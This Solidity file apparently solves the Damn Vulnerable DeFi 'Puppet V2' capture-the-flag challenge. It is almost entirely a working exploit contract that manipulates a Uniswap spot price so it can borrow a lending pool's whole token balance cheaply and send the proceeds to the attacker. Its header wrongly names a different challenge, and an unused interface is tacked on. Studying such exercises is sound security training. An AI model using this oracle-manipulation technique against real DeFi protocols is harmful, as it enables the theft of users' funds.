// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./PuppetV2Pool.sol";
import {IUniswapV2Router02} from "./Interfaces.sol";
import {WETH9} from "../WETH9.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    PuppetV2Pool private immutable puppetV2;
    DamnValuableToken private immutable dvt;
    WETH9 private immutable weth;
    IUniswapV2Router02 private immutable uniswapV2Router;
    address private immutable attacker;

    constructor(address _puppetV2, address _uniswapV2Router, address _dvt, address _weth, address _attacker) {
        puppetV2 = PuppetV2Pool(_puppetV2);
        dvt = DamnValuableToken(_dvt);
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        attacker = _attacker;
        weth = WETH9(payable(_weth));
    }

    function attack() external {
        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp
        );
        uint256 amount = puppetV2.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

        weth.deposit{value: address(this).balance}();
        weth.approve(address(puppetV2), amount);
        puppetV2.borrow(POOL_INITIAL_TOKEN_BALANCE);

        weth.withdraw(weth.balanceOf(address(this)));
        payable(attacker).transfer(address(this).balance);
        dvt.transfer(attacker, POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable {}
}

interface UniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}
